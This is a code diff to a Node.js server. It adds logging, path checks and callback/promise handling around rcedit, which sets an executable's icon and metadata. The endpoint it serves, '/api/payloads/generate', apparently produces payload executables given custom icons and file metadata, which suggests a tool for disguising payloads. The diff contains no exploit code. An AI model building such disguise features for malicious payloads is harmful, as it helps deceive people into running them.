@@ -1272,8 +1272,18 @@ const getRcedit = () => {
     if (!rcedit) {
         try {
             rcedit = require('rcedit');
+            console.log('rcedit module loaded successfully');
+            // Check if it's a function or has a default export
+            if (typeof rcedit !== 'function' && typeof rcedit.default === 'function') {
+                console.log('rcedit uses default export');
+            } else if (typeof rcedit === 'function') {
+                console.log('rcedit is a function');
+            } else {
+                console.log('rcedit module structure:', Object.keys(rcedit));
+            }
         } catch (e) {
             console.error('rcedit not installed. Run: npm install rcedit');
+            console.error('Error details:', e.message);
             return null;
         }
     }
@@ -1287,11 +1297,24 @@ const applyIconToExe = async (exePath, iconPath, metadata = {}) => {
         throw new Error('rcedit not installed. Run: npm install rcedit');
     }
     
+    // Ensure absolute paths
+    const absoluteExePath = path.resolve(exePath);
+    const absoluteIconPath = iconPath ? path.resolve(iconPath) : null;
+    
+    // Verify files exist
+    if (!fs.existsSync(absoluteExePath)) {
+        throw new Error(`Executable not found: ${absoluteExePath}`);
+    }
+    if (absoluteIconPath && !fs.existsSync(absoluteIconPath)) {
+        throw new Error(`Icon file not found: ${absoluteIconPath}`);
+    }
+    
     const options = {};
     
-    // Apply icon if provided
-    if (iconPath) {
-        options.icon = iconPath;
+    // Apply icon if provided (use absolute path)
+    if (absoluteIconPath) {
+        options.icon = absoluteIconPath;
+        console.log(`Setting icon to: ${absoluteIconPath}`);
     }
     
     // Apply file metadata if provided
@@ -1335,9 +1358,60 @@ const applyIconToExe = async (exePath, iconPath, metadata = {}) => {
         options['version-string'] = versionString;
     }
     
+    // Log what we're applying
+    console.log(`Applying rcedit to: ${absoluteExePath}`);
+    console.log(`Options:`, JSON.stringify(options, null, 2));
+    
     // Only call rcedit if we have options to apply
     if (Object.keys(options).length > 0) {
-        await rceditModule(exePath, options);
+        try {
+            // rcedit can be called as a function or might need .default
+            let rceditFunc = rceditModule;
+            if (typeof rceditModule === 'object' && typeof rceditModule.default === 'function') {
+                rceditFunc = rceditModule.default;
+            } else if (typeof rceditModule === 'object' && typeof rceditModule.rcedit === 'function') {
+                rceditFunc = rceditModule.rcedit;
+            }
+            
+            // Call rcedit - wrap in Promise to handle both callback and promise patterns
+            await new Promise((resolve, reject) => {
+                try {
+                    const result = rceditFunc(absoluteExePath, options, (error) => {
+                        // Callback pattern
+                        if (error) {
+                            console.error('rcedit callback error:', error);
+                            reject(error);
+                        } else {
+                            console.log('rcedit completed successfully (callback)');
+                            resolve();
+                        }
+                    });
+                    
+                    // If it returns a promise, use that instead
+                    if (result && typeof result.then === 'function') {
+                        result.then(() => {
+                            console.log('rcedit completed successfully (promise)');
+                            resolve();
+                        }).catch((err) => {
+                            console.error('rcedit promise error:', err);
+                            reject(err);
+                        });
+                    } else if (result === undefined) {
+                        // No return value and no callback - assume it's synchronous
+                        console.log('rcedit completed (synchronous)');
+                        resolve();
+                    }
+                } catch (syncError) {
+                    console.error('rcedit synchronous error:', syncError);
+                    reject(syncError);
+                }
+            });
+        } catch (rceditError) {
+            console.error('rcedit error details:', rceditError);
+            console.error('Error message:', rceditError.message);
+            console.error('Error stack:', rceditError.stack);
+            throw new Error(`rcedit failed: ${rceditError.message || rceditError}`);
+        }
     }
 };
 
@@ -1454,6 +1528,7 @@ app.post('/api/payloads/generate', authenticateToken, (req, res) => {
                 
                 // Apply the icon and metadata using rcedit
                 try {
+                    console.log(`Attempting to apply icon/metadata to: ${tempExePath}`);
                     await applyIconToExe(tempExePath, iconPath, fileMetadata);
                     if (iconPath) {
                         console.log('Custom icon applied successfully');
@@ -1462,9 +1537,13 @@ app.post('/api/payloads/generate', authenticateToken, (req, res) => {
                         console.log('File metadata applied successfully');
                     }
                     exeBuffer = fs.readFileSync(tempExePath);
+                    console.log(`Modified executable size: ${exeBuffer.length} bytes`);
                 } catch (editError) {
                     console.error('Failed to apply icon/metadata:', editError);
-                    // Continue without icon/metadata on error
+                    console.error('Error message:', editError.message);
+                    console.error('Error stack:', editError.stack);
+                    // Continue without icon/metadata on error, but log it clearly
+                    console.warn('Continuing with unmodified executable due to rcedit error');
                     exeBuffer = fs.readFileSync(payloadPath);
                 }
             } else {
